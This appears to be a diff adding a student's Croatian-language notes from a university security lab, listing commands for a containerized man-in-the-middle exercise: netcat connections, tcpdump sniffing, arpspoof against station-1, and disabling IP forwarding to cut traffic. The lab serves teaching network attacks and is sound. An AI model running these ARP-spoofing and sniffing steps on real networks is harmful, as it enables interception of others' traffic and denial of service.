@@ -1,0 +1,21 @@
+wsl //linux server
+pwd //lokacija
+git clone https://github.com/mcagalj/SRP-2021-22 //kloniranje repozitorija u folder
+cd //promijenit folder
+mkdir //napravit folder
+dir //sadrzaj foldera
+./start.sh
+docker ps //pokazuje da su pokrenuti containeri
+uname //ime op sustava
+hostname //di smo trenutno s terminalom
+ifconfig -a //ip i ethernet adresa
+ping station-2 //za dokazat da je station-2 na istoj mrezi
+netcat -l -p 9000
+netcat station-2 9000 //veza izmedu 2 stationa, "slusa" na portu 9000, TCP server, narusavamo integrity
+tcpdump //slusa na ethernetu
+arpspoof //alat za spoofanje -t target -r host
+arpspoof -t station-1 station-2 // varamo 1 da smo 2
+preko tcpdump sada vidimo promet, narusavamo confidentiality
+tcpdump -X host station-1 and not arp //filter
+echo 0 > /proc/sys/net/ipv4/ip_forward //naredba evil stationu da ne prosljeduje, narusen availability
+eth 02 03, ip adr 2 4 //eth adresa bi trebala biti 02 04
